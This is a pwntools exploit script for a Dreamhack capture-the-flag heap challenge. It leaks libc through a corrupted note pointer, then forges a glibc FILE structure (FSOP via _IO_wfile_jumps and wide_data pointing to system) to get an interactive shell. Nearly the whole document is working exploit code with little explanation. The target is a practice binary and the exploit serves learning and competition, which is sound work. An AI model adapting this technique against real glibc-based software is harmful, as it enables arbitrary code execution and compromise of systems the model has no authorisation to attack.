#!/usr/bin/python3 
from pwn import *

exe = ELF('./prob_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)
slan = lambda msg, n: sla(msg, str(n).encode())
san = lambda msg, n: sa(msg, str(n).encode())
sln = lambda n: sl(str(n).encode())
sn = lambda n: s(str(n).encode())

ru = lambda data: p.recvuntil(data)
rud = lambda data: p.recvuntil(data, drop=True)
rl = lambda p: p.recvline()
r = lambda count: p.recv(count)

leak = lambda i, offset = 0: u64(i.ljust(8, b'\0')) - offset
leak_hex = lambda i, offset = 0: int(i, 16) - offset
leak_dec = lambda i, offset = 0: int(i, 10) - offset
info = lambda msg, addr: log.info(msg + hex(addr))

def GDB():
	gdb.attach(p, gdbscript='''
		b* _IO_wdoallocbuf
		c
		''')

HOST = "host8.dreamhack.games"	
PORT = 12230

if args.REMOTE:
	p = remote(HOST, PORT)
else:
	p = process(exe.path)

def allocate_note(data):
	sla(b'> ', b'1')
	sla(b'note: ', data)
def edit_note(idx, data):
	sla(b'> ', b'2')
	slan(b'edit: ', idx)
	sla(b'content: ', data)
def free_note(idx):
	sla(b'> ', b'3')
	slan(b'free: ', idx)
def print_note(idx):
	sla(b'> ', b'4')
	slan(b'print: ', idx)

#GDB() #offset in server = 0x780 # libc = 2.35 (link list attack)
rw_section = 0x404500
input("Stage 1: Leak libc")
allocate_note(b'A')
allocate_note(b'A')
edit_note(0, b'\x00' * 0x400 + p64(0x404018)) 
print_note(1)
ru(b'Note[1]: ')
stdout = leak(r(6)) 
libc.address = stdout - libc.sym._IO_2_1_stdout_
info("libc leak: ", libc.address)
input("Stage 2: FSOP -> puts")
edit_note(0, b'\x00' * 0x400 + p64(rw_section))
pld = p64(libc.sym.system)
pld = pld.ljust(0xe0 - 0x8, b'\x00') + p64(0x4044a0)
edit_note(1, pld)
edit_note(0, b'\x00' * 0x400 + p64(stdout - 0x8))
pld = b'\x01\x01;sh;\x00\x00'
pld = pld.ljust(0x88, b'\x00') + p64(stdout + 0x70)
pld = pld.ljust(0xa0, b'\x00') + p64(rw_section) #wide_data
pld = pld.ljust(0xd8, b'\x00') + p64(libc.sym._IO_wfile_jumps - 0x20) #vtable
edit_note(1, pld)
p.interactive()